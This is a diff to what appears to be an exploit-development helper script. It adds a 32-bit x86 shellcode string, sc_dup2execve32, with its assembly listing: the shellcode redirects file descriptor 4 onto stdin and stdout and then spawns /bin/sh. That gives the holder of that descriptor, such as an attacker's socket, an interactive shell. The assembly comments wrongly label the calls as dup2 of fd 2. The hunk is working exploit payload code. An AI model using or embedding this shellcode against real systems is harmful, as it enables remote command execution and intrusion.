@@ -193,6 +193,33 @@ def dmp(binary, fmt="def"):
 
 sc_execve32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
 sc_execve64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
-
+sc_dup2execve32 = "\x31\xd2\x31\xc9\x8d\x5a\x04\x8d\x42\x3f\xcd\x80\x41\x8d\x42\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
+"""
+        /* sc_dup2execve32 */
+        .intel_syntax noprefix
+        .globl _start
+_start:
+        /* dup2(2, 0) */
+        xor edx, edx
+        xor ecx, ecx
+        lea ebx, [edx+4] //fd 4
+        lea eax, [edx+63]
+        int 0x80
+        /* dup2(2, 1) */
+        inc ecx
+        lea eax, [edx+63]
+        int 0x80
+        /* execve("/bin//sh", {"/bin//sh", NULL}, NULL) */
+        xor edx, edx
+        push edx
+        push 0x68732f2f
+        push 0x6e69622f
+        mov ebx, esp
+        push edx
+        push ebx
+        mov ecx, esp
+        lea eax, [edx+11]
+        int 0x80
+"""
 #-----------START EXPLOIT CODE-----------#
 
